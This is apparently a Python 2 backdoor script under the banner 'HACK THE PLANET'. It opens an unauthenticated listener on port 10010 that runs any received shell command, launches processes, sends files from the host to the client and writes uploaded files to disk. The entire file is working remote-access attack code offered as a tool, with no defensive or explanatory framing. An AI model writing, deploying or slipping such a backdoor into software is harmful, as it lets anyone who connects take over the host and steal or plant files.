# HACK THE PLANET
# change any port number at line number 17

import socket
import os
import subprocess

# the flag below is used to determine the end of
# transmitting data, socket will receive another incoming packet
# until it receives END_OF_STRING flag.
END_OF_STRING = "[XX]END OF STRING[XX]"
END_OF_FILE = "[XX]END OF DATA[XX]"


def createServer():
    global session
    port = 10010

    session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    session.bind(("", port))
    session.listen(1)
    listeningServer()


def sessionManagement():
    # This function will be called when client reconnect the server
    global connection
    connection, address = session.accept()


def sendResult(args):
    connection.send(args + END_OF_STRING)


def listeningServer():
    while True:
        try:
            command = connection.recv(1024)

            if command == "Disconnect":
                # client indicate that he is going to disconnect
                # so close connection
                connection.close()

            elif command.startswith(":"):
                # if command starts with ":", it is valid

                if command[1:3] == "cd":
                    try:
                        os.chdir(command[4:])
                        args = "moved to another directory\n"
                        sendResult(args)
                    except:
                        # prevent server from stop working
                        # if user enter directory name wrongly
                        args = "directory not found\n"
                        sendResult(args)

                elif command[1:11] == "newProcess":
                    if command[12:] == "":
                        # if program is not provided
                        args = "Provide program name"
                    else:
                        # Run the program in new process
                        subprocess.Popen(
                            command[12:],
                            shell=True)
                        args = "Running program in a new process\n"
                    sendResult(args)

                elif command[1:9] == "download":
                    # Tranferring Data from Server > Client

                    # set file name
                    fileName = command[10:]

                    try:
                        f = open(fileName, 'r')
                        l = f.read(1024)

                        while (l):
                            connection.send(l)
                            l = f.read(1024)
                        f.close()
                        connection.send(END_OF_FILE)

                    except IOError:
                        args = "File not found\n" + END_OF_STRING
                        sendResult(args)

                elif command[1:7] == "upload":
                    # set file name
                    fileName = command[8:]

                    f = open(fileName, 'w')

                    # Begin downloading
                    while True:
                        l = connection.recv(1024)

                        while (l):
                            if l.endswith(END_OF_FILE):
                                if END_OF_FILE in l:
                                    # removing END_OF_FILE flag
                                    l = l.replace(END_OF_FILE, "")
                                f.write(l)
                                args = "Upload complete\n"
                                sendResult(args)
                                break
                            else:
                                f.write(l)
                                l = connection.recv(1024)
                        break

                    # closing file
                    f.close()

                else:
                    process = subprocess.Popen(
                        command[1:], shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE)
                    args = process.stdout.read() + process.stderr.read()
                    sendResult(args)

                    # If command is empty, add feedback just in case
                    if len(args) == 0:
                        args = "command executed\n"
                        sendResult(args)

            else:
                # command does not starts with ":" then
                args = "Invalid command\n"
                sendResult(args)
        except:
            # if client reconnect, call sessionManagement()
            # to recreate connection
            sessionManagement()

if __name__ == "__main__":
    createServer()
